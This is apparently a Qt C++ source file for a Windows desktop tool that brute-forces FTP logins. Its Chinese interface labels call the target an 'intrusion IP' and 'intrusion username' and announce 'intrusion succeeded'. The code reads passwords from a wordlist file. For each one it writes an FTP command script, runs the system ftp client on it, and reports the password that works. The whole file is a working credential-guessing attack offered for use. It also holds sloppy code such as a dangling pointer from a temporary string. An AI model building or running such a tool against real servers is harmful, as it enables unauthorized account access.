#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QFileDialog>
#include <QString>
#include <QTextCodec>
#include <string.h>
#include <QDebug>

FILE * fp = NULL;
MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
}

MainWindow::~MainWindow()
{
    fclose(fp);
    delete ui;
}

void MainWindow::on_action_triggered()
{
    QString fileName = QFileDialog::getOpenFileName();
    QTextCodec * codec = QTextCodec::codecForName("GBK");
    char * file = codec->fromUnicode(fileName).data();
    fp = fopen(file,"r");
    if(!fp)
    {
        ui->label_4->setText(codec->toUnicode("打开密码文件失败！"));
        return;
    }


    ui->label_4->setText(codec->toUnicode("打开密码文件成功！"));
}

void MainWindow::on_pushButton_clicked()
{
    QTextCodec * codec = QTextCodec::codecForName("GBK");

    if(fp==NULL){
        ui->label_4->setText(codec->toUnicode("请导入密码文件！"));
        return;
    }

    QString ip = ui->textEdit->toPlainText();
    QString user = ui->textEdit_2->toPlainText();
    if(ip.isEmpty()){
        ui->label_4->setText(codec->toUnicode("请输入入侵IP！"));
        return;
    }

    if(user.isEmpty()){
        ui->label_4->setText(codec->toUnicode("请输入入侵用户名！"));
        return;
    }
    char pass[20];//000001
    char buf[1024];
    char content[1024];
    while(1){
        memset(pass,0,20);
        memset(buf,0,1024);
        fgets(pass,20,fp);
        //open 192.168.1.123
        //user
        //user
        //000001
        //bye
        sprintf(buf,"open %s\nuser\n%s\n%sbye",
                ip.toStdString().data(),
                user.toStdString().data(),
                pass);
        //qDebug()<<buf;
        FILE * fp1 = fopen("D:\\a.txt","w");
        if(!fp1){
            ui->label_4->setText(codec->toUnicode("生成密钥格式文件失败！"));
            return;
        }
        fputs(buf,fp1);
        fclose(fp1);

        //开始入侵
        FILE *fp2 = _popen("ftp -n -s:D:\\a.txt","r");
        if(!fp2){
            ui->label_4->setText(codec->toUnicode("控制台运行文件失败！"));
            return;
        }
        memset(content,0,1024);

        int index = 0;
        while(!feof(fp2)){
            fgets(content,1024,fp2);

           //qDebug()<<content;
            //比对  是否成功   草率？？
            if(index==4 &&!strncmp("bye",content,3)){
                ui->label_4->setText(codec->toUnicode("恭喜您入侵成功！"));
                ui->textEdit_3->setText(pass);
                fclose(fp);
                _pclose(fp2);
                return;

            }
            index++;
        }
        _pclose(fp2);
    }
}
